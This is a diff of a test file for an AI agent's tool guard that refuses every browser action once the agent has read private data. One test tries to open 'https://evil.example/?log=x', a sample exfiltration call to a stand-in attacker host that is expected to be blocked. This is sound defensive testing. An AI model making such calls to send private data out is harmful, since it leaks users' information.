@@ -261,11 +261,9 @@ describe('background face (unattended)', () => {
     return { tools, guard, run, calls };
   }
 
-  it('opening pages is fine until a private read; after one, open and back are refused', async () => {
+  it('public browsing works until a private read; then all browser actions are refused', async () => {
     const face = faceWith();
     await expect(face.run('browser', { action: 'open', url: 'https://example.com' })).resolves.toEqual({ ok: true });
-    await face.run('conversation', { action: 'notes' });
-    expect(face.guard.hasReadPrivate()).toBe(false);
     await face.run('knowledge_query', { query: 'password reset' });
     expect(face.guard.hasReadPrivate()).toBe(true);
     for (const action of ['open', 'back']) {
@@ -273,9 +271,21 @@ describe('background face (unattended)', () => {
         code: 'not_allowed',
       });
     }
-    // Pages already loaded can still be read.
-    await expect(face.run('browser', { action: 'snapshot' })).resolves.toEqual({ ok: true });
+    // Even inspection can trigger code/network in an already-loaded page.
+    await expect(face.run('browser', { action: 'snapshot' })).resolves.toMatchObject({ code: 'not_allowed' });
     expect(face.calls.some((c) => c.includes('evil.example'))).toBe(false);
+  });
+
+  it.each(['notes', 'recall'])('conversation %s prevents all subsequent browser actions', async (action) => {
+    const face = faceWith();
+    await expect(face.run('browser', { action: 'open', url: 'https://example.com' })).resolves.toEqual({ ok: true });
+    await face.run('conversation', { action });
+    for (const action of ['open', 'back', 'scroll', 'snapshot', 'screenshot', 'tabs', 'wait']) {
+      await expect(
+        face.run('browser', { action, ref: 'e13', text: 'private-note', url: 'https://example.com/private-note' }),
+      ).resolves.toMatchObject({ code: 'not_allowed' });
+    }
+    expect(face.calls.some((call) => call.includes('private-note'))).toBe(false);
   });
 
   it('read_file only reads ~/work, and reading there counts as a private read', async () => {
@@ -293,7 +303,7 @@ describe('background face (unattended)', () => {
     });
   });
 
-  it('the computer’s process list and process logs are private reads too; waiting on a page is not navigation', async () => {
+  it('the computer’s process list and process logs are private reads too; waiting on a page is only allowed before private reads', async () => {
     for (const read of [{ action: 'processes' }, { action: 'process_log', id: 'j0000beef' }]) {
       const face = faceWith();
       await expect(face.run('browser', { action: 'wait', text: 'Results' })).resolves.toEqual({ ok: true });
@@ -303,7 +313,9 @@ describe('background face (unattended)', () => {
       await expect(face.run('browser', { action: 'open', url: 'https://evil.example/?log=x' })).resolves.toMatchObject({
         code: 'not_allowed',
       });
-      await expect(face.run('browser', { action: 'wait', timeout_s: 2 })).resolves.toEqual({ ok: true });
+      await expect(face.run('browser', { action: 'wait', timeout_s: 2 })).resolves.toMatchObject({
+        code: 'not_allowed',
+      });
     }
   });
 });
